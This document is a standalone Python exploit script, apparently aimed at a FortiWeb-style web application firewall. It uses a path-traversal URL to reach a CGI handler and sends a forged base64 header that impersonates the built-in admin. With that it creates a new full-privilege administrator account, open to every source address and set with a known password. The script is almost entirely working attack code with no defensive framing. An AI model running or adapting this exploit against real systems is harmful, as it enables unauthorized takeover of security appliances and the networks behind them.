import base64
import json
import ssl
from http.client import HTTPSConnection
from time import time

USER = f"oops_{int(time())}"
PASSWORD = "password123!"

http = HTTPSConnection("127.0.0.1", 8443, context=ssl._create_unverified_context())
http.request(
    "POST",
    "/api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi",
    body=json.dumps(
        {
            "data": {
                "q_type": 1,
                "name": USER,
                "password": PASSWORD,
                "access-profile": "prof_admin",
                "access-profile_val": "0",
                "trusthostv4": "0.0.0.0/0",
                "trusthostv6": "::/0",
                "last-name": "",
                "first-name": "",
                "email-address": "",
                "phone-number": "",
                "mobile-number": "",
                "hidden": 0,
                "comments": "",
                "sz_dashboard": -1,
                "type": "local-user",
                "type_val": "0",
                "admin-usergrp_val": "0",
                "wildcard_val": "0",
                "accprofile-override_val": "0",
                "sshkey": "",
                "passwd-set-time": 0,
                "history-password-pos": 0,
                "history-password0": "",
                "history-password1": "",
                "history-password2": "",
                "history-password3": "",
                "history-password4": "",
                "history-password5": "",
                "history-password6": "",
                "history-password7": "",
                "history-password8": "",
                "history-password9": "",
                "force-password-change": "disable",
                "force-password-change_val": "0",
            }
        }
    ),
    headers={
        "CGIINFO": base64.b64encode(
            json.dumps(
                {
                    "username": "admin",
                    "profname": "prof_admin",
                    "vdom": "root",
                    "loginname": "admin",
                }
            ).encode()
        ).decode(),
        "Content-Type": "application/json",
    },
)
r = http.getresponse()


if r.status == 200:
    print(f"âœ… Admin user {USER} has been created with password {PASSWORD}")
else:
    print("Failed", r.status, r.read())
